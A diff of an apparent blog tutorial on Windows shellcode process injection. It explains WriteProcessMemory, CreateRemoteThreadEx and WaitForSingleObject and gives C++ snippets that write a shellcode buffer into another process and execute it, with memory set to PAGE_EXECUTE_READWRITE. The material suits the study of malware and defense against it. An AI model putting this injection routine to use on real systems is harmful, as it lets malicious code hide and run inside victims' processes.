@@ -103,7 +103,7 @@ The `VirtualAllocEx` function returns the base address of the allocated memory r
 - **LPVOID lpAddress**: An optional parameter that defines the starting address of the allocation within the virtual address space. It can be set to `NULL` to allow the program to determine the allocation region automatically.
 - **SIZE_T dwSize**: Contains the size of the allocated region that we need to allocate. This means the size of our shellcode.
 - **DWORD flAllocationType**: Contains the type of memory allocation that we need to define. Microsoft has provided a list of such types depending on the requirements. As we are reserving the region of the virtual address and then committing our shellcode, to do that in a single step, it is recommended to use `MEM_COMMIT | MEM_RESERVE`. There are additional types like `MEM_RESET`, `MEM_RESET_UNDO`, `MEM_LARGE_PAGES`, `MEM_PHYSICAL`, and `MEM_TOP_DOWN` if you would like to explore.
-- **DWORD flProtect**: Contains the memory protection constants defined by Microsoft. We will be using `PAGE_READWRITE` and `PAGE_EXECUTE` values for it since we need to allocate the memory region, write into that region, and execute the shellcode. You can explore other [constants here.](https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants)
+- **DWORD flProtect**: Contains the memory protection constants defined by Microsoft. We will be using `PAGE_EXECUTE_READWRITE` values for it since we need to allocate the memory region, write into that region, and execute the shellcode. You can explore other [constants here.](https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants)
 
 Once we are ready with the function and its parameters, let's define it inside our `InjectShellcode` function.
  
@@ -113,16 +113,138 @@ Once we are ready with the function and its parameters, let's define it inside o
     // Define the neede parameters.
     LPVOID lpAddress = NULL; // NULL to instruct program to figure out the starting region by themselves
     SIZE_T dwSize = sizeof(wannabe); // Size of the shellcode
-    DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE; // Reserve and commit in sigle step 
-    DWORD flProtect = PAGE_READWRITE | PAGE_EXECUTE; // Necessary permission to write and execute the shellcode
+    DWORD flAllocationType = (MEM_COMMIT | MEM_RESERVE); // Reserve and commit in sigle step 
+    DWORD flProtect = PAGE_EXECUTE_READWRITE; // Necessary permission to write and execute the shellcode
 
 // Define the function VirtualAllocEx
-    LPVOID lpBuffer = VirtualAllocEx(hProcess, 
+    LPVOID lpAlloc = VirtualAllocEx(hProcess, 
     lpAddress, dwSize, flAllocationType, flProtect);
-  	if (lpBuffer == NULL){
+  	if (lpAlloc == NULL){
   		printf("\nFailed to Allocate the memory\n");
   		CloseHandle(hProcess);
-  		return 1;
+  		return;
   	}
     printf("Allocated the memory into virtual space");
 ```
+
+**Write Buffer into the Allocated Memory -** **[WriteProcessMemory]**(https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
+Once we have allocated our memory into the virtual address space, the next process is to write the buffer (shellcode) into that memory space. In order for this function to execute successfully, the handle to the process must contain **PROCESS_VM_WRITE** and **PROCESS_VM_OPERATION** access. Therefore, it is necessary to define such access while creating a handle to the process using **OpenProcess**. The return type for this function when it succeeds is nonzero and returns 0 when it fails. It contains five parameters in which four are input parameters and one is output.
+
+**SYNTAX**
+```c++
+BOOL WriteProcessMemory(
+  [in]  HANDLE  hProcess,
+  [in]  LPVOID  lpBaseAddress,
+  [in]  LPCVOID lpBuffer,
+  [in]  SIZE_T  nSize,
+  [out] SIZE_T  *lpNumberOfBytesWritten
+);
+```
+- **HANDLE hProcess**: Contains the handle to the process where we need to write the buffer.
+- **LPVOID lpBaseAddress**: A pointer to the base address where we need to write the buffer. It's the return value of VirtualAllocEx.
+- **LPCVOID lpBuffer**: A pointer to the shellcode buffer.
+- **SIZE_T nSize**: Size of the buffer.
+- **SIZE_T \*lpNumberOfBytesWritten***: Output variable which provides the number of bytes written to the memory address.
+
+So generally, here we are accessing the handle of the process, navigating through the address allocation provided by VirtualAllocEx, and writing the buffer into the allocated memory.
+
+```c++
+    // Declare the parameters for WriteProcessMemory
+    LPVOID lpBaseAddress = lpAlloc;
+    LPCVOID lpBuffer = wannabe;
+    SIZE_T nSize = sizeof(wannabe) - 1;
+    SIZE_T lpNumberOfbytesWritten;
+
+  	BOOL bWriteBuffer = WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, &lpNumberOfbytesWritten);
+  	
+    if (bWriteBuffer == FALSE){
+  		printf("Failed to Write Memory to the process\n");
+  		CloseHandle(hProcess);
+  		return;
+  	}
+
+  	printf("Successfully wrote memory to the process\n");
+```
+
+**Execute the Shellcode -** **[CreateRemoteThreadEx](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethreadex)**
+Once we have our shellcode written into the memory address, we can execute that shellcode using a new thread. A running process contains a number of threads running inside it which have their own objectives. A thread can execute any part of the code in the process; therefore, our shellcode could be executed as well. We just need to provide it a clear instruction about the location of our shellcode. It returns a handle to the new thread when it succeeds and the return value will be NULL if it fails.
+
+```c++
+HANDLE CreateRemoteThreadEx(
+  [in]            HANDLE                       hProcess,
+  [in, optional]  LPSECURITY_ATTRIBUTES        lpThreadAttributes,
+  [in]            SIZE_T                       dwStackSize,
+  [in]            LPTHREAD_START_ROUTINE       lpStartAddress,
+  [in, optional]  LPVOID                       lpParameter,
+  [in]            DWORD                        dwCreationFlags,
+  [in, optional]  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
+  [out, optional] LPDWORD                      lpThreadId
+);
+```
+- **HANDLE hProcess**: Contains the handle to the process. In order for this to execute successfully, while defining **OpenProcess** functions it must be defined with access rights as `PROCESS_CREATE_THREAD`, `PROCESS_QUERY_INFORMATION`, `PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, and `PROCESS_VM_READ`.
+- **LPSECURITY_ATTRIBUTES lpThreadAttributes**: Defines whether a child process can inherit the returned handle. We do not need that as we do not want our shellcode to be executed on the child process. We can set this as `NULL`.
+- **SIZE_T dwStackSize**: Defines the size of the [stack](https://learn.microsoft.com/en-us/windows/win32/procthread/thread-stack-size) for the thread. We can set it as 0 to instruct the thread to use the default size of the executable.
+- **LPTHREAD_START_ROUTINE lpStartAddress**: Defines the start address of the allocated memory, but Microsoft wants this as an application-defined function of type `LPTHREAD_START_ROUTINE`. This `LPTHREAD_START_ROUTINE` is the thing that will give you the starting address for the thread and is documented under [ThreadProc](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms686736(v=vs.85)?redirectedfrom=MSDN). We discussed earlier that the thread can execute any portion of the memory on the process, but it's obvious that we need to instruct the thread which portion to go and execute. So this can be done by that routine. And since we need our thread to start executing from the starting portion of the allocated memory, the value for it will be `LPTHREAD_START_ROUTINE(lpAlloc)` and lpAlloc contains the return type of VirtualAllocEx.
+- **LPVOID lpParameter**: If we want to pass the variable to the thread, then we need to pass the pointer to the variable, but since we have already written our shellcode and do not need this, we can set this as NULL.
+- **DWORD dwCreationFlags**: Instructs the thread when to start. We can pass the value 0 to start the thread immediately once created.
+- **LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList**: It contains the list of attributes to define how the process or thread behaves and interacts with the system, like the parent process and handle inheritance. Since this is an optional parameter and I do not know what to do with this parameter, we can keep this as NULL.
+- **[out, optional] LPDWORD lpThreadId**: It provides the identifier for the thread which executes the shellcode. We can set this as NULL as we do not want this.
+
+```c++
+
+    // Declaring the variables for CreateRemoteThreadEx
+    LPSECURITY_ATTRIBUTES lpThreadAttributes = NULL;
+    SIZE_T dwStackSize = 0;
+    LPTHREAD_START_ROUTINE lpStartAddress = (LPTHREAD_START_ROUTINE)lpAlloc;
+    LPVOID lpParameter = NULL;
+    DWORD dwCreationFlags = 0;
+    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList = 0;
+    LPDWORD lpThreadId = NULL;
+
+    // Create a handle to the Thread
+    HANDLE hThread = CreateRemoteThreadEx(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags,lpAttributeList, lpThreadId);
+
+  	if (hThread == NULL){
+  		printf("Failed Creating a Remote Thread\n");
+  		CloseHandle(hProcess);
+  		return;
+  	}
+```
+
+Once we have executed our thread, we need to close the handle to the thread and the process as well. But how does the program know when to close the thread and process? This is where the function **[WaitForSingleObject](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject)** comes in. This function waits until the thread completes its execution and then the program proceeds further to close the handle to the process and thread.
+
+**SYNTAX**
+```c++
+DWORD WaitForSingleObject(
+  [in] HANDLE hHandle,
+  [in] DWORD  dwMilliseconds
+);
+```
+
+- **HANDLE hHandle**: Handle to the process or thread. Since we are waiting for our thread to complete the execution, we will use the handle to the thread.
+- **DWORD dwMilliseconds**: Timeout in milliseconds. If we set the value to INFINITE, then the function will return only after the thread completes its work and enters its signaled stage.
+
+```c++
+  	WaitForSingleObject(hThread, INFINITE);
+
+  	printf("Successfully injected into process %lu\n", pid);
+
+  	CloseHandle(hThread);
+  	CloseHandle(hProcess);
+
+  	return;
+```
+
+<br>
+<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/process-injection-shellcode.gif">
+
+**References**
+- [https://www.crow.rip/crows-nest/mal/dev/inject/shellcode-injection](https://www.crow.rip/crows-nest/mal/dev/inject/shellcode-injection)
+- [https://redfoxsec.com/blog/process-injection-harnessing-the-power-of-shellcode](https://redfoxsec.com/blog/process-injection-harnessing-the-power-of-shellcode)
+- [https://www.ired.team/offensive-security/code-injection-process-injection/process-injection](https://www.ired.team/offensive-security/code-injection-process-injection/process-injection)
+- [https://github.com/ZeroMemoryEx/Shellcode-Injector](https://github.com/ZeroMemoryEx/Shellcode-Injector)
+- [https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
+- [https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
+- [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethreadex](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethreadex)
+- [https://learn.microsoft.com/en-us/windows/win32/procthread/thread-stack-size](https://learn.microsoft.com/en-us/windows/win32/procthread/thread-stack-size)
+- [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)
